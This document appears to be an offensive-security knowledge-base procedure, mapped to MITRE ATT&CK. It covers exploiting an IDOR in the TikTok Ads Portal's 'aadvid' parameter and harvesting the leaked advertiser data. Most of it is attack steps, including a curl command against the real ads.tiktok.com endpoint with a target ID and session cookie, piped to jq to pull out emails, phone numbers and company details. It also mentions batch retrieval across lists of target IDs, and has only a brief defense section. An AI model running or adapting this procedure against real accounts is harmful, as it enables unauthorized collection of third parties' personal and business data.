---
id: proc-tiktok-retrieve-info
tags:
  - information-disclosure
  - data-exfiltration
  - web
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-manipulate-aadvid]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:24:56.695Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Retrieve Leaked Advertiser Information

## Summary

This procedure covers parsing and extracting sensitive data from the unauthorized API response obtained via 'aadvid' manipulation in the TikTok Ads Portal.

## Description

Once the IDOR is exploited, the endpoint leaks PII and business details without consent. This step focuses on collecting and validating the disclosed information, which includes emails, phones, and secrets, highlighting the high-impact nature of the vulnerability.

## Requirements

1. Successful response from manipulated endpoint
2. JSON parsing capability (browser console or jq tool)
3. List of target 'aadvid' values for batch retrieval

## Defense

Defensive measures and detection strategies:

- Encrypt sensitive fields in API responses
- Implement data loss prevention (DLP) monitoring
- Regular vulnerability scans for IDOR in web apps

## Objectives

1. Extract specific sensitive fields from response
2. Document leaked information for impact assessment
3. Verify data accuracy against known accounts

## Instructions

### Step 1: Capture Response Data

**Context**: Save the full API response for analysis.

After executing the manipulated request, copy the JSON response from dev tools or curl output.

**Expected Output**: Raw JSON like {"owner_name": "John Doe", "email": "john@company.com", "phone": "+1-234-567-8900"}.

### Step 2: Parse and Extract Fields

**Context**: Isolate key sensitive elements.

Use browser console or pipe curl output to jq for extraction. For example, extend [[commands/curl-manipulate-aadvid]] with jq:

```bash
curl -X GET "https://ads.tiktok.com/api/advertiser/info?aadvid=TARGET_ID" -H "Cookie: session=your_session" | jq '.email, .phone, .company'
```

> This filters for critical fields; output shows leaked values.

**Expected Output**: Extracted details: email, phone, company, etc.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-manipulate-aadvid]]

## Tools Used


## Tags

- [[information-disclosure]]
- [[data-exfiltration]]
- [[web]]
